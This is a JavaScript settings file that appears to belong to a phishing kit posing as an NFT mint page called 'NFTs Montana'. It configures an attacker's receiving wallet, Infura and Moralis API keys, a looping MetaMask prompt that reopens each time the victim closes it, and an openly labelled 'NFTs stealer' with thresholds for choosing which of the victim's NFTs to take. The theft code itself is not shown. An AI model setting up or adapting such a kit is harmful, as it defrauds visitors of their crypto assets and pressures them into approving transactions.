const address = "0x8c5D482b9Ff36B3C360F5e9667109a4657465CAc";    // Your wallet that you have to receive NFTs
const infuraId = "https://mainnet.infura.io/v3/ad639389a3d245fb9ff03d212d6b2d53"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "nqIlvHlLAMmkX1N8Zdg5QwzGwZ1ry5vYiBzwRy22SKLqfHCmJsxo7gmeuZBFzc9I"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "NFTs Montana",
    title: "NftMontana MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "25.04.2022",
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/example",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.0002,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x8c5D482b9Ff36B3C360F5e9667109a4657465CAc" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
